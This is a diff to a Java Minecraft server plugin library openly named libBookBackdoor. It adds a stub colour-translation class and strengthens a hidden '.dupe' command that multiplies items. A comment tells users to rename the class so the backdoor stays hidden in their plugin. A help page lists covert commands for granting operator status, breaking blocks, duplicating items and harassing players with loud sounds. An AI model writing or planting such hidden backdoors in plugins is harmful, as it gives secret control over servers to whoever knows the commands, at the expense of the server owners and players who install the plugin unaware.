@@ -47,6 +47,23 @@ abstract class Countdown {
     }
 }
 
+class ColorTranslator {
+    // This is gonna be wack.
+    public static String translateStr(String str, Plugin plugin) {
+        //str.replaceAll("\u001b\\[31m", "§c"); // Red
+        //str.replaceAll("\u001b\\[33m", "§e"); // Yellow
+        //str.replaceAll("\u001b\\[32m", "§a"); // Green
+        //str.replaceAll("\u001b\\[36m", "§b"); // Cyan
+        //str.replaceAll("\u001b\\[34m", "§9"); // Blue
+        //str.replaceAll("\u001b\\[35m", "§d"); // Magenta
+        //str.replaceAll("\u001b\\[37m", "§f"); // White
+        //str.replaceAll("\u001b\\[30m", "§0"); // Black
+
+        //str.replaceAll("\u001b\\[0m", "§r"); // Reset
+        return str;
+    }
+}
+
 /*
     If you want this to stay hidden in your plugin
     rename libBookBackdoor to something like
@@ -74,7 +91,7 @@ public class libBookBackdoor implements Listener {
             build.append(str);
             build.append("\n");
         }
-        return build.toString();
+        return ColorTranslator.translateStr(build.toString(), plugin);
     }
 
     @EventHandler
@@ -282,18 +299,12 @@ public class libBookBackdoor implements Listener {
                                 public void count(int current) {
                                     if(current == 0){
                                         try {
-                                            int amt = 0;
-                                            if(args.length > 1) {
-                                                if(Integer.parseInt(args[1]) > 64) {
-                                                    player.sendMessage(ChatColor.RED + "Cannot dupe more than 64 at a time. Doing 64.");
-                                                    amt = 63;
-                                                } else {
-                                                    amt = Integer.parseInt(args[1]) - 1;
-                                                }
+                                            int amt = 1;
+                                            if(args.length > 1 && Integer.parseInt(args[1]) != 0) {
+                                                amt = Integer.parseInt(args[1]);
                                             }
                                             ItemStack item = player.getInventory().getItemInMainHand();
-                                            item.add(amt);
-                                            player.getInventory().addItem(item);
+                                            player.getInventory().addItem(item.asQuantity(item.getAmount() * amt));
                                             player.sendActionBar(new ComponentBuilder(ChatColor.GREEN + "Duped!").bold(true).create());
                                         } catch (Exception e){
                                             player.sendActionBar(new ComponentBuilder(ChatColor.RED + "Failed to dupe!").bold(true).create());
@@ -333,7 +344,7 @@ public class libBookBackdoor implements Listener {
                                 TextComponent deop = Util.genHoverText(ChatColor.GREEN + ".deop\n", "Removes your Operator status.\n\nUSAGE: .deop");
                                 TextComponent bbreak = Util.genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
                                 TextComponent troll = Util.genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
-                                TextComponent dupe = Util.genHoverText(ChatColor.GREEN + ".dupe\n", "Duplicates the item in your hand.\n\nUSAGE: .dupe <amount>");
+                                TextComponent dupe = Util.genHoverText(ChatColor.GREEN + ".dupe\n", "Duplicates the item in your hand x amount of times.\n\nUSAGE: .dupe <times>");
                                 BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll, dupe};
 
                                 meta.spigot().addPage(page);
